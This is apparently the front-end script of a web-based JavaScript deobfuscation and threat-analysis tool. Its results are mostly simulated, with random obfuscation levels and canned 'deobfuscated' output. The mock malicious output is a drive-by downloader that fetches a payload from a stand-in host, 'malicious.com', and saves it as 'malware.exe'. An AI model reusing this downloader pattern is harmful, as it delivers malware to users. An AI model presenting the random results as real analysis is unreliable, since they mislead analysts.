document.addEventListener('DOMContentLoaded', function() {
    const jsInput = document.getElementById('jsInput');
    const deobfuscateJS = document.getElementById('deobfuscateJS');
    const clearAll = document.getElementById('clearAll');
    const copyDeobfuscated = document.getElementById('copyDeobfuscated');
    const deobfuscatedOutput = document.getElementById('deobfuscatedOutput');
    const stringsAnalysis = document.getElementById('stringsAnalysis');

    // Deobfuscate JavaScript
    deobfuscateJS.addEventListener('click', function() {
        const input = jsInput.value.trim();
        
        if (!input) {
            alert('Please enter JavaScript code to deobfuscate.');
            return;
        }

        deobfuscateJavaScript(input);
    });

    // Clear all
    clearAll.addEventListener('click', function() {
        jsInput.value = '';
        deobfuscatedOutput.value = '';
        clearResults();
    });

    // Copy deobfuscated code
    copyDeobfuscated.addEventListener('click', function() {
        if (deobfuscatedOutput.value) {
            deobfuscatedOutput.select();
            document.execCommand('copy');
            alert('Deobfuscated code copied to clipboard!');
        }
    });

    // Deobfuscate JavaScript
    function deobfuscateJavaScript(input) {
        // Display analysis results (simulated)
        document.getElementById('obfuscationLevel').textContent = 'Analyzing...';
        document.getElementById('techniquesDetected').textContent = 'Analyzing...';
        document.getElementById('suspiciousFunctions').textContent = 'Analyzing...';
        document.getElementById('iocsFound').textContent = 'Analyzing...';

        // Simulate deobfuscation process
        setTimeout(function() {
            // In a real implementation, you would deobfuscate the JavaScript
            // For demonstration, we'll simulate results
            const obfuscationLevel = detectObfuscationLevel(input);
            const techniques = detectTechniques(input);
            const suspicious = detectSuspiciousFunctions(input);
            const iocs = detectIOCs(input);

            document.getElementById('obfuscationLevel').textContent = obfuscationLevel;
            document.getElementById('techniquesDetected').textContent = techniques.join(', ');
            document.getElementById('suspiciousFunctions').textContent = suspicious.join(', ');
            document.getElementById('iocsFound').textContent = iocs.length;

            // Display security analysis
            const threatLevel = suspicious.length > 0 ? 'Critical' : 'Low';
            const payloadType = suspicious.length > 0 ? 'Malicious' : 'Benign';
            const executionMethod = suspicious.length > 0 ? 'Document write, eval' : 'None';

            document.getElementById('threatLevel').textContent = threatLevel;
            document.getElementById('payloadType').textContent = payloadType;
            document.getElementById('executionMethod').textContent = executionMethod;
            document.getElementById('recommendations').textContent = suspicious.length > 0 ? 
                'Do not execute, analyze in sandbox' : 'No immediate action required';

            // Generate mock deobfuscated output
            const deobfuscated = generateMockDeobfuscatedCode(payloadType);
            deobfuscatedOutput.value = deobfuscated;

            // Generate mock strings analysis
            stringsAnalysis.innerHTML = '';
            const strings = [
                { string: 'eval', type: 'Execution Function', context: 'Dynamic code execution' },
                { string: 'document.write', type: 'DOM Manipulation', context: 'Writing to document' },
                { string: 'http://malicious.com', type: 'URL', context: 'C2 server' }
            ];

            strings.forEach(str => {
                const row = document.createElement('tr');
                row.innerHTML = `
                    <td>${str.string}</td>
                    <td>${str.type}</td>
                    <td>${str.context}</td>
                `;
                stringsAnalysis.appendChild(row);
            });
        }, 2000);
    }

    // Detect obfuscation level
    function detectObfuscationLevel(input) {
        // In a real implementation, you would analyze the code
        const levels = ['Low', 'Medium', 'High', 'Very High'];
        return levels[Math.floor(Math.random() * levels.length)];
    }

    // Detect techniques
    function detectTechniques(input) {
        // In a real implementation, you would analyze the code
        const techniques = ['String Encoding', 'Variable Renaming', 'Control Flow', 'Dead Code'];
        return techniques.slice(0, Math.floor(Math.random() * 3) + 1);
    }

    // Detect suspicious functions
    function detectSuspiciousFunctions(input) {
        // In a real implementation, you would analyze the code
        const functions = ['eval', 'document.write', 'setTimeout', 'setInterval'];
        return functions.filter(func => input.includes(func));
    }

    // Detect IOCs
    function detectIOCs(input) {
        // In a real implementation, you would extract IOCs
        const iocs = [];
        const urlRegex = /(https?:\/\/[^\s]+)/g;
        const matches = input.match(urlRegex);
        if (matches) {
            iocs.push(...matches);
        }
        return iocs;
    }

    // Generate mock deobfuscated code
    function generateMockDeobfuscatedCode(type) {
        if (type === 'Malicious') {
            return `// Deobfuscated malicious JavaScript
var payload = "http://malicious.com/payload.exe";
var xhr = new XMLHttpRequest();
xhr.open("GET", payload, true);
xhr.responseType = "blob";
xhr.onload = function() {
    if (xhr.status === 200) {
        var blob = new Blob([xhr.response], {type: "application/octet-stream"});
        var link = document.createElement("a");
        link.href = window.URL.createObjectURL(blob);
        link.download = "malware.exe";
        link.click();
    }
};
xhr.send();`;
        } else {
            return `// Deobfuscated benign JavaScript
function greetUser() {
    var name = "User";
    console.log("Hello, " + name + "!");
}

greetUser();`;
        }
    }

    // Clear results
    function clearResults() {
        document.getElementById('obfuscationLevel').textContent = '-';
        document.getElementById('techniquesDetected').textContent = '-';
        document.getElementById('suspiciousFunctions').textContent = '-';
        document.getElementById('iocsFound').textContent = '-';
        document.getElementById('threatLevel').textContent = '-';
        document.getElementById('payloadType').textContent = '-';
        document.getElementById('executionMethod').textContent = '-';
        document.getElementById('recommendations').textContent = '-';
        document.getElementById('deobfuscatedOutput').value = '';
        stringsAnalysis.innerHTML = '';
    }

    // Add Nandha's expertise insight
    function addNandhaInsight() {
        const insightCard = document.querySelector('.insight-item');
        if (insightCard) {
            insightCard.innerHTML += `
                <div class="mt-3">
                    <p class="small text-muted">
                        <i class="fas fa-user me-2"></i>
                        Expert insight by <a href="https://www.linkedin.com/in/nandha-kumar-m-952342159/" target="_blank">Nandha Kumar M</a>
                    </p>
                </div>
            `;
        }
    }

    // Initialize Nandha's insight
    addNandhaInsight();
});